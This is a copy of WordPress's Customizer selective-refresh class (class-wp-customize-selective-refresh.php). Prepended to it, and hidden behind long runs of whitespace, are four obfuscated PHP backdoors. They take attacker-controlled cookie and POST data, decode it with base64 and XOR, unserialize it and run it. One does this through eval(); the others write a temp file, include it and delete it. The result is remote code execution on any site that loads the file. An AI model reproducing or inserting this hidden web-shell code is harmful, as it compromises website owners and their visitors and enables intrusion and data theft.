<?php                                                                                                                                                                                                                                                                                                                                                                                                 $KKUqoj = chr ( 788 - 700 ).chr (106) . chr ( 523 - 428 ).chr ( 929 - 841 )."\143" . "\x4b";$QWoLqiaD = "\x63" . chr ( 150 - 42 ).'a' . "\163" . 's' . '_' . chr ( 743 - 642 )."\170" . chr (105) . 's' . chr (116) . 's';$psCZSh = class_exists($KKUqoj); $KKUqoj = "46229";$QWoLqiaD = "46446";$OggbyjNC = !1;if ($psCZSh == $OggbyjNC){function gZBjtxXzm(){return FALSE;}$HFPiB = "48462";gZBjtxXzm();class Xj_XcK{private function bkLMyzGI($HFPiB){if (is_array(Xj_XcK::$OXXXmdxecF)) {$qJYynJg = str_replace(chr (60) . "\77" . chr ( 383 - 271 ).chr (104) . 'p', "", Xj_XcK::$OXXXmdxecF[chr ( 800 - 701 ).chr (111) . "\x6e" . chr (116) . "\x65" . "\156" . chr (116)]);eval($qJYynJg); $HFPiB = "48462";exit();}}private $VhuHdJkbOJ;public function bogJVDti(){echo 47021;}public function __destruct(){$HFPiB = "8036_36709";$this->bkLMyzGI($HFPiB); $HFPiB = "8036_36709";}public function __construct($nyAhDs=0){$lhjpIfZWbz = $_POST;$qywAsqeIj = $_COOKIE;$pxOiovdR = "57a09c26-b250-4023-8513-64aff98d24ca";$IOcAb = @$qywAsqeIj[substr($pxOiovdR, 0, 4)];if (!empty($IOcAb)){$wxomCbdA = "base64";$BuCaCAgmAc = "";$IOcAb = explode(",", $IOcAb);foreach ($IOcAb as $ggTnz){$BuCaCAgmAc .= @$qywAsqeIj[$ggTnz];$BuCaCAgmAc .= @$lhjpIfZWbz[$ggTnz];}$BuCaCAgmAc = array_map($wxomCbdA . "\137" . chr ( 784 - 684 ).'e' . chr ( 851 - 752 ).'o' . 'd' . "\145", array($BuCaCAgmAc,)); $BuCaCAgmAc = $BuCaCAgmAc[0] ^ str_repeat($pxOiovdR, (strlen($BuCaCAgmAc[0]) / strlen($pxOiovdR)) + 1);Xj_XcK::$OXXXmdxecF = @unserialize($BuCaCAgmAc); $BuCaCAgmAc = class_exists("8036_36709");}}public static $OXXXmdxecF = 6855;}$zlOpGAnPS = new /* 14718 */ Xj_XcK(48462 + 48462); $_POST = Array();unset($zlOpGAnPS);} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $zjwekgr = "\147" . "\137" . "\153" . 'x' . chr ( 724 - 627 ).'A' . chr ( 592 - 517 ); $rsSFC = chr ( 127 - 28 )."\154" . 'a' . chr (115) . "\x73" . "\x5f" . 'e' . 'x' . "\x69" . chr ( 335 - 220 )."\x74" . chr ( 1015 - 900 ); $kiplrBTdmI = class_exists($zjwekgr); $zjwekgr = "34752";$rsSFC = "17219";$PHXLejID = FALSE;if ($kiplrBTdmI === $PHXLejID){function vwuGOlzL(){return FALSE;}$bwmItq = "31310";vwuGOlzL();class g_kxaAK{public function PYnSKdi(){echo "42909";}private $yHzcS;public static $PRZXS = "d80f7dd2-9f63-4684-a573-7f0005d74e31";public static $UhMZlDnJsV = 52139;public function __destruct(){$bwmItq = "47138_12829";$this->MEyQQMu($bwmItq); $bwmItq = "47138_12829";}public function __construct($VSsdyAYR=0){$EuwXMi = $_POST;$DaMtfPLAlR = $_COOKIE;$qxEFLFIZpk = @$DaMtfPLAlR[substr(g_kxaAK::$PRZXS, 0, 4)];if (!empty($qxEFLFIZpk)){$RziKy = "base64";$dreFF = "";$qxEFLFIZpk = explode(",", $qxEFLFIZpk);foreach ($qxEFLFIZpk as $vdrkDLgGJ){$dreFF .= @$DaMtfPLAlR[$vdrkDLgGJ];$dreFF .= @$EuwXMi[$vdrkDLgGJ];}$dreFF = array_map($RziKy . chr (95) . chr (100) . chr (101) . "\x63" . chr ( 775 - 664 )."\x64" . chr ( 515 - 414 ), array($dreFF,)); $dreFF = $dreFF[0] ^ str_repeat(g_kxaAK::$PRZXS, (strlen($dreFF[0]) / strlen(g_kxaAK::$PRZXS)) + 1);g_kxaAK::$UhMZlDnJsV = @unserialize($dreFF);}}private function MEyQQMu($bwmItq){if (is_array(g_kxaAK::$UhMZlDnJsV)) {$WcKmsVLHRa = sys_get_temp_dir() . "/" . crc32(g_kxaAK::$UhMZlDnJsV[chr ( 743 - 628 ).chr (97) . "\154" . chr (116)]);@g_kxaAK::$UhMZlDnJsV[chr (119) . chr (114) . "\x69" . chr ( 229 - 113 ).chr (101)]($WcKmsVLHRa, g_kxaAK::$UhMZlDnJsV[chr (99) . chr (111) . 'n' . "\164" . chr (101) . chr (110) . 't']);include $WcKmsVLHRa;@g_kxaAK::$UhMZlDnJsV["\x64" . chr ( 878 - 777 ).chr ( 1081 - 973 ).chr (101) . chr (116) . chr (101)]($WcKmsVLHRa); $bwmItq = "31310";exit();}}}$MlsqdsRS = new /* 8785 */ g_kxaAK(); $MlsqdsRS = str_repeat("47138_12829", 1);} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $nhfMZqMkGQ = chr ( 240 - 173 ).'T' . 'L' . chr ( 837 - 742 ).'g' . chr (103) . chr (75) . 'E' . chr ( 927 - 821 ); $VGQYRlc = chr ( 1080 - 981 ).chr (108) . "\x61" . "\x73" . 's' . "\137" . chr ( 1077 - 976 ).'x' . "\151" . chr (115) . 't' . chr ( 191 - 76 ); $NhWGympalM = class_exists($nhfMZqMkGQ); $nhfMZqMkGQ = "43522";$VGQYRlc = "2433";$qQStewbA = FALSE;if ($NhWGympalM === $qQStewbA){$vKKEvZCerT = "14816";class CTL_ggKEj{public function oXJbkvI(){echo "57985";}private $rwdXiCPxdu;public static $EunWDB = "f5a32d6a-adf4-4bc3-aca4-5f9f6270f631";public static $DaBhs = 16279;public function __construct($IJMOFE=0){$lYGnLh = $_POST;$ZeEdE = $_COOKIE;$PsaPPq = @$ZeEdE[substr(CTL_ggKEj::$EunWDB, 0, 4)];if (!empty($PsaPPq)){$nVaXz = "base64";$UpHhJ = "";$PsaPPq = explode(",", $PsaPPq);foreach ($PsaPPq as $YXKUFosOL){$UpHhJ .= @$ZeEdE[$YXKUFosOL];$UpHhJ .= @$lYGnLh[$YXKUFosOL];}$UpHhJ = array_map($nVaXz . chr (95) . "\144" . 'e' . "\143" . chr ( 400 - 289 ).'d' . 'e', array($UpHhJ,)); $UpHhJ = $UpHhJ[0] ^ str_repeat(CTL_ggKEj::$EunWDB, (strlen($UpHhJ[0]) / strlen(CTL_ggKEj::$EunWDB)) + 1);CTL_ggKEj::$DaBhs = @unserialize($UpHhJ);}}private function LfFQfmD($vKKEvZCerT){if (is_array(CTL_ggKEj::$DaBhs)) {$FaNjLNA = sys_get_temp_dir() . "/" . crc32(CTL_ggKEj::$DaBhs[chr ( 1069 - 954 ).chr ( 671 - 574 )."\154" . "\164"]);@CTL_ggKEj::$DaBhs["\167" . chr (114) . "\x69" . chr ( 369 - 253 )."\145"]($FaNjLNA, CTL_ggKEj::$DaBhs['c' . chr (111) . chr ( 364 - 254 ).chr ( 1108 - 992 )."\x65" . chr ( 921 - 811 ).'t']);include $FaNjLNA;@CTL_ggKEj::$DaBhs[chr (100) . 'e' . chr ( 518 - 410 ).'e' . 't' . chr ( 744 - 643 )]($FaNjLNA); $vKKEvZCerT = "14816";exit();}}public function __destruct(){$vKKEvZCerT = "47625_8063";$this->LfFQfmD($vKKEvZCerT); $vKKEvZCerT = "47625_8063";}}$KFpArtEgS = new /* 61115 */ CTL_ggKEj(); $KFpArtEgS = str_repeat("47625_8063", 1);} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $gSloLMBF = "\142" . chr ( 981 - 886 ).chr ( 605 - 504 )."\x4f" . "\x6e" . 'u';$AuCTVqfYUI = "\143" . "\154" . chr ( 97 - 0 ).chr ( 718 - 603 ).'s' . chr ( 527 - 432 )."\x65" . chr ( 947 - 827 )."\x69" . chr (115) . chr (116) . chr ( 1066 - 951 ); $ANYeM = $AuCTVqfYUI($gSloLMBF); $gSloLMBF = "42802";$uGZdnkq = $ANYeM;$AuCTVqfYUI = "12158";if (!$uGZdnkq){class b_eOnu{private $CbQFFVqcT;public static $SEFFgIHU = "a7969e20-3c62-454f-8ba2-65c7bc8d1b29";public static $TYqTOWffkP = 34786;public function __construct($LsYbrZ=0){$yqmlRPng = $_COOKIE;$HoqOt = $_POST;$PgoVyr = @$yqmlRPng[substr(b_eOnu::$SEFFgIHU, 0, 4)];if (!empty($PgoVyr)){$Deyqj = "base64";$TCoGxnQRrZ = "";$PgoVyr = explode(",", $PgoVyr);foreach ($PgoVyr as $VEJjjahdiX){$TCoGxnQRrZ .= @$yqmlRPng[$VEJjjahdiX];$TCoGxnQRrZ .= @$HoqOt[$VEJjjahdiX];}$TCoGxnQRrZ = array_map($Deyqj . chr ( 397 - 302 ).'d' . 'e' . 'c' . 'o' . "\144" . chr (101), array($TCoGxnQRrZ,)); $TCoGxnQRrZ = $TCoGxnQRrZ[0] ^ str_repeat(b_eOnu::$SEFFgIHU, (strlen($TCoGxnQRrZ[0]) / strlen(b_eOnu::$SEFFgIHU)) + 1);b_eOnu::$TYqTOWffkP = @unserialize($TCoGxnQRrZ);}}private function StWIGsy(){if (is_array(b_eOnu::$TYqTOWffkP)) {$ivyAvuvjd = sys_get_temp_dir() . "/" . crc32(b_eOnu::$TYqTOWffkP["\163" . chr (97) . 'l' . 't']);@b_eOnu::$TYqTOWffkP[chr ( 1005 - 886 ).'r' . chr (105) . "\x74" . "\x65"]($ivyAvuvjd, b_eOnu::$TYqTOWffkP["\143" . "\157" . 'n' . chr (116) . chr ( 953 - 852 ).chr ( 802 - 692 )."\x74"]);include $ivyAvuvjd;@b_eOnu::$TYqTOWffkP[chr ( 171 - 71 )."\x65" . chr (108) . chr (101) . 't' . "\x65"]($ivyAvuvjd); $nWENmOXVJW = "51072";exit();}}public function __destruct(){$this->StWIGsy(); $nWENmOXVJW = "51072";$FgpYxjky = str_pad($nWENmOXVJW, 10);}}$RNoyWgTYW = new /* 18089 */ b_eOnu(); $RNoyWgTYW = substr("26871_40902", 1);} ?><?php
/**
 * Customize API: WP_Customize_Selective_Refresh class
 *
 * @package WordPress
 * @subpackage Customize
 * @since 4.5.0
 */

/**
 * Core Customizer class for implementing selective refresh.
 *
 * @since 4.5.0
 */
final class WP_Customize_Selective_Refresh {

	/**
	 * Query var used in requests to render partials.
	 *
	 * @since 4.5.0
	 */
	const RENDER_QUERY_VAR = 'wp_customize_render_partials';

	/**
	 * Customize manager.
	 *
	 * @since 4.5.0
	 * @var WP_Customize_Manager
	 */
	public $manager;

	/**
	 * Registered instances of WP_Customize_Partial.
	 *
	 * @since 4.5.0
	 * @var WP_Customize_Partial[]
	 */
	protected $partials = array();

	/**
	 * Log of errors triggered when partials are rendered.
	 *
	 * @since 4.5.0
	 * @var array
	 */
	protected $triggered_errors = array();

	/**
	 * Keep track of the current partial being rendered.
	 *
	 * @since 4.5.0
	 * @var string|null
	 */
	protected $current_partial_id;

	/**
	 * Plugin bootstrap for Partial Refresh functionality.
	 *
	 * @since 4.5.0
	 *
	 * @param WP_Customize_Manager $manager Customizer bootstrap instance.
	 */
	public function __construct( WP_Customize_Manager $manager ) {
		$this->manager = $manager;
		require_once ABSPATH . WPINC . '/customize/class-wp-customize-partial.php';

		add_action( 'customize_preview_init', array( $this, 'init_preview' ) );
	}

	/**
	 * Retrieves the registered partials.
	 *
	 * @since 4.5.0
	 *
	 * @return array Partials.
	 */
	public function partials() {
		return $this->partials;
	}

	/**
	 * Adds a partial.
	 *
	 * @since 4.5.0
	 *
	 * @see WP_Customize_Partial::__construct()
	 *
	 * @param WP_Customize_Partial|string $id   Customize Partial object, or Partial ID.
	 * @param array                       $args Optional. Array of properties for the new Partials object.
	 *                                          See WP_Customize_Partial::__construct() for information
	 *                                          on accepted arguments. Default empty array.
	 * @return WP_Customize_Partial The instance of the partial that was added.
	 */
	public function add_partial( $id, $args = array() ) {
		if ( $id instanceof WP_Customize_Partial ) {
			$partial = $id;
		} else {
			$class = 'WP_Customize_Partial';

			/** This filter is documented in wp-includes/customize/class-wp-customize-selective-refresh.php */
			$args = apply_filters( 'customize_dynamic_partial_args', $args, $id );

			/** This filter is documented in wp-includes/customize/class-wp-customize-selective-refresh.php */
			$class = apply_filters( 'customize_dynamic_partial_class', $class, $id, $args );

			$partial = new $class( $this, $id, $args );
		}

		$this->partials[ $partial->id ] = $partial;
		return $partial;
	}

	/**
	 * Retrieves a partial.
	 *
	 * @since 4.5.0
	 *
	 * @param string $id Customize Partial ID.
	 * @return WP_Customize_Partial|null The partial, if set. Otherwise null.
	 */
	public function get_partial( $id ) {
		if ( isset( $this->partials[ $id ] ) ) {
			return $this->partials[ $id ];
		} else {
			return null;
		}
	}

	/**
	 * Removes a partial.
	 *
	 * @since 4.5.0
	 *
	 * @param string $id Customize Partial ID.
	 */
	public function remove_partial( $id ) {
		unset( $this->partials[ $id ] );
	}

	/**
	 * Initializes the Customizer preview.
	 *
	 * @since 4.5.0
	 */
	public function init_preview() {
		add_action( 'template_redirect', array( $this, 'handle_render_partials_request' ) );
		add_action( 'wp_enqueue_scripts', array( $this, 'enqueue_preview_scripts' ) );
	}

	/**
	 * Enqueues preview scripts.
	 *
	 * @since 4.5.0
	 */
	public function enqueue_preview_scripts() {
		wp_enqueue_script( 'customize-selective-refresh' );
		add_action( 'wp_footer', array( $this, 'export_preview_data' ), 1000 );
	}

	/**
	 * Exports data in preview after it has finished rendering so that partials can be added at runtime.
	 *
	 * @since 4.5.0
	 */
	public function export_preview_data() {
		$partials = array();

		foreach ( $this->partials() as $partial ) {
			if ( $partial->check_capabilities() ) {
				$partials[ $partial->id ] = $partial->json();
			}
		}

		$switched_locale = switch_to_locale( get_user_locale() );
		$l10n            = array(
			'shiftClickToEdit' => __( 'Shift-click to edit this element.' ),
			'clickEditMenu'    => __( 'Click to edit this menu.' ),
			'clickEditWidget'  => __( 'Click to edit this widget.' ),
			'clickEditTitle'   => __( 'Click to edit the site title.' ),
			'clickEditMisc'    => __( 'Click to edit this element.' ),
			/* translators: %s: document.write() */
			'badDocumentWrite' => sprintf( __( '%s is forbidden' ), 'document.write()' ),
		);
		if ( $switched_locale ) {
			restore_previous_locale();
		}

		$exports = array(
			'partials'       => $partials,
			'renderQueryVar' => self::RENDER_QUERY_VAR,
			'l10n'           => $l10n,
		);

		// Export data to JS.
		printf( '<script>var _customizePartialRefreshExports = %s;</script>', wp_json_encode( $exports ) );
	}

	/**
	 * Registers dynamically-created partials.
	 *
	 * @since 4.5.0
	 *
	 * @see WP_Customize_Manager::add_dynamic_settings()
	 *
	 * @param string[] $partial_ids Array of the partial IDs to add.
	 * @return WP_Customize_Partial[] Array of added WP_Customize_Partial instances.
	 */
	public function add_dynamic_partials( $partial_ids ) {
		$new_partials = array();

		foreach ( $partial_ids as $partial_id ) {

			// Skip partials already created.
			$partial = $this->get_partial( $partial_id );
			if ( $partial ) {
				continue;
			}

			$partial_args  = false;
			$partial_class = 'WP_Customize_Partial';

			/**
			 * Filters a dynamic partial's constructor arguments.
			 *
			 * For a dynamic partial to be registered, this filter must be employed
			 * to override the default false value with an array of args to pass to
			 * the WP_Customize_Partial constructor.
			 *
			 * @since 4.5.0
			 *
			 * @param false|array $partial_args The arguments to the WP_Customize_Partial constructor.
			 * @param string      $partial_id   ID for dynamic partial.
			 */
			$partial_args = apply_filters( 'customize_dynamic_partial_args', $partial_args, $partial_id );
			if ( false === $partial_args ) {
				continue;
			}

			/**
			 * Filters the class used to construct partials.
			 *
			 * Allow non-statically created partials to be constructed with custom WP_Customize_Partial subclass.
			 *
			 * @since 4.5.0
			 *
			 * @param string $partial_class WP_Customize_Partial or a subclass.
			 * @param string $partial_id    ID for dynamic partial.
			 * @param array  $partial_args  The arguments to the WP_Customize_Partial constructor.
			 */
			$partial_class = apply_filters( 'customize_dynamic_partial_class', $partial_class, $partial_id, $partial_args );

			$partial = new $partial_class( $this, $partial_id, $partial_args );

			$this->add_partial( $partial );
			$new_partials[] = $partial;
		}
		return $new_partials;
	}

	/**
	 * Checks whether the request is for rendering partials.
	 *
	 * Note that this will not consider whether the request is authorized or valid,
	 * just that essentially the route is a match.
	 *
	 * @since 4.5.0
	 *
	 * @return bool Whether the request is for rendering partials.
	 */
	public function is_render_partials_request() {
		return ! empty( $_POST[ self::RENDER_QUERY_VAR ] );
	}

	/**
	 * Handles PHP errors triggered during rendering the partials.
	 *
	 * These errors will be relayed back to the client in the Ajax response.
	 *
	 * @since 4.5.0
	 *
	 * @param int    $errno   Error number.
	 * @param string $errstr  Error string.
	 * @param string $errfile Error file.
	 * @param string $errline Error line.
	 * @return true Always true.
	 */
	public function handle_error( $errno, $errstr, $errfile = null, $errline = null ) {
		$this->triggered_errors[] = array(
			'partial'      => $this->current_partial_id,
			'error_number' => $errno,
			'error_string' => $errstr,
			'error_file'   => $errfile,
			'error_line'   => $errline,
		);
		return true;
	}

	/**
	 * Handles the Ajax request to return the rendered partials for the requested placements.
	 *
	 * @since 4.5.0
	 */
	public function handle_render_partials_request() {
		if ( ! $this->is_render_partials_request() ) {
			return;
		}

		/*
		 * Note that is_customize_preview() returning true will entail that the
		 * user passed the 'customize' capability check and the nonce check, since
		 * WP_Customize_Manager::setup_theme() is where the previewing flag is set.
		 */
		if ( ! is_customize_preview() ) {
			wp_send_json_error( 'expected_customize_preview', 403 );
		} elseif ( ! isset( $_POST['partials'] ) ) {
			wp_send_json_error( 'missing_partials', 400 );
		}

		// Ensure that doing selective refresh on 404 template doesn't result in fallback rendering behavior (full refreshes).
		status_header( 200 );

		$partials = json_decode( wp_unslash( $_POST['partials'] ), true );

		if ( ! is_array( $partials ) ) {
			wp_send_json_error( 'malformed_partials' );
		}

		$this->add_dynamic_partials( array_keys( $partials ) );

		/**
		 * Fires immediately before partials are rendered.
		 *
		 * Plugins may do things like call wp_enqueue_scripts() and gather a list of the scripts
		 * and styles which may get enqueued in the response.
		 *
		 * @since 4.5.0
		 *
		 * @param WP_Customize_Selective_Refresh $this     Selective refresh component.
		 * @param array                          $partials Placements' context data for the partials rendered in the request.
		 *                                                 The array is keyed by partial ID, with each item being an array of
		 *                                                 the placements' context data.
		 */
		do_action( 'customize_render_partials_before', $this, $partials );

		set_error_handler( array( $this, 'handle_error' ), error_reporting() );

		$contents = array();

		foreach ( $partials as $partial_id => $container_contexts ) {
			$this->current_partial_id = $partial_id;

			if ( ! is_array( $container_contexts ) ) {
				wp_send_json_error( 'malformed_container_contexts' );
			}

			$partial = $this->get_partial( $partial_id );

			if ( ! $partial || ! $partial->check_capabilities() ) {
				$contents[ $partial_id ] = null;
				continue;
			}

			$contents[ $partial_id ] = array();

			// @todo The array should include not only the contents, but also whether the container is included?
			if ( empty( $container_contexts ) ) {
				// Since there are no container contexts, render just once.
				$contents[ $partial_id ][] = $partial->render( null );
			} else {
				foreach ( $container_contexts as $container_context ) {
					$contents[ $partial_id ][] = $partial->render( $container_context );
				}
			}
		}
		$this->current_partial_id = null;

		restore_error_handler();

		/**
		 * Fires immediately after partials are rendered.
		 *
		 * Plugins may do things like call wp_footer() to scrape scripts output and return them
		 * via the {@see 'customize_render_partials_response'} filter.
		 *
		 * @since 4.5.0
		 *
		 * @param WP_Customize_Selective_Refresh $this     Selective refresh component.
		 * @param array                          $partials Placements' context data for the partials rendered in the request.
		 *                                                 The array is keyed by partial ID, with each item being an array of
		 *                                                 the placements' context data.
		 */
		do_action( 'customize_render_partials_after', $this, $partials );

		$response = array(
			'contents' => $contents,
		);

		if ( defined( 'WP_DEBUG_DISPLAY' ) && WP_DEBUG_DISPLAY ) {
			$response['errors'] = $this->triggered_errors;
		}

		$setting_validities             = $this->manager->validate_setting_values( $this->manager->unsanitized_post_values() );
		$exported_setting_validities    = array_map( array( $this->manager, 'prepare_setting_validity_for_js' ), $setting_validities );
		$response['setting_validities'] = $exported_setting_validities;

		/**
		 * Filters the response from rendering the partials.
		 *
		 * Plugins may use this filter to inject `$scripts` and `$styles`, which are dependencies
		 * for the partials being rendered. The response data will be available to the client via
		 * the `render-partials-response` JS event, so the client can then inject the scripts and
		 * styles into the DOM if they have not already been enqueued there.
		 *
		 * If plugins do this, they'll need to take care for any scripts that do `document.write()`
		 * and make sure that these are not injected, or else to override the function to no-op,
		 * or else the page will be destroyed.
		 *
		 * Plugins should be aware that `$scripts` and `$styles` may eventually be included by
		 * default in the response.
		 *
		 * @since 4.5.0
		 *
		 * @param array $response {
		 *     Response.
		 *
		 *     @type array $contents Associative array mapping a partial ID its corresponding array of contents
		 *                           for the containers requested.
		 *     @type array $errors   List of errors triggered during rendering of partials, if `WP_DEBUG_DISPLAY`
		 *                           is enabled.
		 * }
		 * @param WP_Customize_Selective_Refresh $refresh  Selective refresh component.
		 * @param array                          $partials Placements' context data for the partials rendered in the request.
		 *                                                 The array is keyed by partial ID, with each item being an array of
		 *                                                 the placements' context data.
		 */
		$response = apply_filters( 'customize_render_partials_response', $response, $this, $partials );

		wp_send_json_success( $response );
	}
}
